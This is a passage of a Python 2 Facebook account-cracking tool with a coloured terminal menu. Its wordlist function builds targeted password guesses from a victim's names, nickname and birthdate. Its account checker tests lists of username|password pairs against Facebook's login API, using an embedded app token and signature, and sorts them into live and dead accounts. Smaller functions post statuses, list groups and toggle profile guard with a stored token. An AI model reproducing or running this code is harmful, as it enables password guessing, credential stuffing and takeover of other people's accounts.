	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Account Checker"
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m See my group list"
	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Profile Guard"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	choosing_again()
#////////////
def choosing_again():
	other = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if other =="":
		print "\033[1;91m[!] Wrong input"
		choosing_again()
	elif other =="1":
		status()
	elif other =="2":
		wordlist()
	elif other =="3":
		check_akun()
	elif other =="4":
		group_list()
	elif other =="5":
		guard()
	elif other =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		choosing_again()

##### STATUS #####
def status():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	msg=raw_input('\033[1;91m[+] \033[1;92mType status \033[1;91m:\033[1;97m ')
	if msg == "":
		print "\033[1;91m[!] Don't be empty"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		func()
	else:
		res = requests.get("https://graph.facebook.com/me/feed?method=POST&message="+msg+"&access_token="+fb_token)
		op = json.loads(res.text)
		mkdir('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
		print 42*"\033[1;97m═"
		print"\033[1;91m[+] \033[1;92mStatus ID\033[1;91m : \033[1;97m"+op['id']
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		func()

########### CREATE WORDLIST ##########
def wordlist():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.system('clear')
		print logo
		print "\033[1;91m[?] \033[1;92mFill in the complete data of the target below"
		print 42*"\033[1;97m═"
		a = raw_input("\033[1;91m[+] \033[1;92mfb_name first \033[1;97m: ")
		file = open(a+".txt", 'w')
		b=raw_input("\033[1;91m[+] \033[1;92mfb_name middle \033[1;97m: ")
		c=raw_input("\033[1;91m[+] \033[1;92mfb_name last \033[1;97m: ")
		d=raw_input("\033[1;91m[+] \033[1;92mfb_name nicke \033[1;97m: ")
		e=raw_input("\033[1;91m[+] \033[1;92mDate of birth >\033[1;96mex: |DDMMYY| \033[1;97m: ")
		f=e[0:2]
		g=e[2:4]
		h=e[4:]
		print 42*"\033[1;97m═"
		print("\033[1;91m[?] \033[1;93mcreate wordlist :v")
		i=raw_input("\033[1;91m[+] \033[1;92mfb_name first \033[1;97m: ")
		j=raw_input("\033[1;91m[+] \033[1;92mfb_name last \033[1;97m: ")
		k=raw_input("\033[1;91m[+] \033[1;92mdate of birth >\033[1;96mex: |DDMMYY| \033[1;97m: ")
		mkdir('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
		l=k[0:2]
		m=k[2:4]
		n=k[4:]
		file.write("%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s" % (a,c,a,b,b,a,b,c,c,a,c,b,a,a,b,b,c,c,a,d,b,d,c,d,d,d,d,a,d,b,d,c,a,e,a,f,a,g,a,h,b,e,b,f,b,g,b,h,c,e,c,f,c,g,c,h,d,e,d,f,d,g,d,h,e,a,f,a,g,a,h,a,e,b,f,b,g,b,h,b,e,c,f,c,g,c,h,c,e,d,f,d,g,d,h,d,d,d,a,f,g,a,g,h,f,g,f,h,f,f,g,f,g,h,g,g,h,f,h,g,h,h,h,g,f,a,g,h,b,f,g,b,g,h,c,f,g,c,g,h,d,f,g,d,g,h,a,i,a,j,a,k,i,e,i,j,i,k,b,i,b,j,b,k,c,i,c,j,c,k,e,k,j,a,j,b,j,c,j,d,j,j,k,a,k,b,k,c,k,d,k,k,i,l,i,m,i,n,j,l,j,m,j,n,j,k))
		wg = 0
		while (wg < 100):
			wg = wg + 1
			file.write(a + str(wg) + '\n')
		en = 0
		while (en < 100):
			en = en + 1
			file.write(i + str(en) + '\n')
		word = 0
		while (word < 100):
			word = word + 1
			file.write(d + str(word) + '\n')
		gen = 0
		while (gen < 100):
			gen = gen + 1
			file.write(j + str(gen) + '\n')
		file.close()
		time.sleep(1.5)
		print 42*"\033[1;97m═"
		print ("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97m %s.txt" %a)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		func()
	except IOError, e:
		print("\033[1;91m[!] Failed")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		func()

##### CHECKER #####
def check_akun():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print "\033[1;91m[?] \033[1;92mCreate in file\033[1;91m : \033[1;97musername|password"
	print 42*"\033[1;97m═"
	live = []
	check_it = []
	die = []
	try:
		file = raw_input("\033[1;91m[+] \033[1;92mFile path \033[1;91m:\033[1;97m ")
		list = open(file,'r').readlines()
	except IOError:
		print ("\033[1;91m[!] File not found")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		func()
	pemisah = raw_input("\033[1;91m[+] \033[1;92mSeparator \033[1;91m:\033[1;97m ")
	mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for meki in list:
		username, password = (meki.strip()).split(str(pemisah))
		url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(password)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
		data = requests.get(url)
		mpsh = json.loads(data.text)
		if 'access_token' in mpsh:
			live.append(password)
			print"\033[1;97m[ \033[1;92mLive\033[1;97m ] \033[1;97m"+username+"|"+password
		elif 'www.facebook.com' in mpsh["error_msg"]:
			check_it.append(password)
			print"\033[1;97m[ \033[1;93mCheck\033[1;97m ] \033[1;97m"+username+"|"+password
		else:
			die.append(password)
			print"\033[1;97m[ \033[1;91mDie\033[1;97m ] \033[1;97m"+username+"|"+password
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mTotal\033[1;91m : \033[1;97mLive=\033[1;92m"+str(len(live))+" \033[1;97mCheck=\033[1;93m"+str(len(check_it))+" \033[1;97mDie=\033[1;91m"+str(len(die))
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	func()

##### group SAYA #####
def group_list():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	try:
		uh = requests.get('https://graph.facebook.com/me/groups?access_token='+fb_token)
		good = json.loads(uh.text)
		for p in good['data']:
			fb_name = p["name"]
			id = p["id"]
			f=open('out/groupid.txt','w')
			listgroup.append(id)
			f.write(id + '\n')
			print "\033[1;97m[ \033[1;92mMyGroup\033[1;97m ] "+str(id)+" => "+str(fb_name)
		print 42*"\033[1;97m═"
		print"\033[1;91m[+] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgroup))
		print("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97mout/groupid.txt")
		f.close()
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		func()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		func()
	except KeyError:
		os.remove('out/groupid.txt')
		print('\033[1;91m[!] Group not found')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		func()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No Connection"
		exit()
	except IOError:
		print "\033[1;91m[!] Error"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		func()

##### PROFILE GUARD #####
def guard():
	global fb_token
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Activate"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Not activate"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	g = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if g == "1":
		activated = "true"
		jay(fb_token, activated)
	elif g == "2":
		not_active = "false"
		jay(fb_token, not_active)
	elif g =="0":
		func()
	elif g =="":
		exit()
	else:
		exit()

def get_userid(fb_token):
	url = "https://graph.facebook.com/me?access_token=%s"%fb_token
	res = requests.get(url)
	uid = json.loads(res.text)
	return uid["id"]

def jay(fb_token, enable = True):
	id = get_userid(fb_token)
	data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
	headers = {"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % fb_token}
	url = "https://graph.facebook.com/graphql"
	res = requests.post(url, data = data, headers = headers)
	print(res.text)
	if '"is_shielded":true' in res.text:
		os.system('clear')
		print logo
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mActivate"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		func()
	elif '"is_shielded":false' in res.text:
		os.system('clear')
		print logo
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;91mNot activate"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		func()
	else:
		print "\033[1;91m[!] Error"
		exit()

if __name__=='__main__':
        tool_main_function()
